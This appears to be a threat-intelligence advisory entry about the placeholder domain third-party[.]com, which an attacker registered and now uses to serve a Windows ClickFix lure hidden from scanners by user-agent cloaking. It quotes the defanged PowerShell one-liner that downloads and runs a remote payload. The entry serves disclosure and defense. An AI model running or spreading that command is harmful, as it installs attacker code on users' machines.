AS289 · 2026-09

Placeholder domain third-party.com turned live ClickFix server

CDN / web assetsAI coding agentsWindows software

Manifold Security found that third-party[.]com — a documentation
placeholder embedded in 1,500+ files across 1,700+ repositories
(Chromium developer docs, Sanity and Vercel skills, MCP-server docs) —
is not IANA-reserved like example.com, and someone registered it. Since
at least June 2026 it has served a Windows-gated ClickFix lure: a fake
Cloudflare verification page poisons the clipboard and walks the user
through Win+R / Ctrl+V / Enter into a PowerShell one-liner
(irm elxxvvx[.]xyz/f | iex) with a decoy captcha comment appended.
macOS/Linux user-agents get a benign decoy, so scanners and
reputation feeds see nothing wrong; the IPFire blocklist listed it on
7 July and de-listed it on 17 July for exactly that reason. Nobody's
file changed — the static string silently started resolving to attacker
infrastructure. Manifold reported the domain to Network Solutions
before publishing; the lure was still live at publication. A follow-up
(24 September) found placeholder ads on parking pages such as
your-domain[.]com and yoursite[.]com serving macOS scareware and
counterfeit BBC/ZDF investment-fraud pages, with every static check
clearing them.
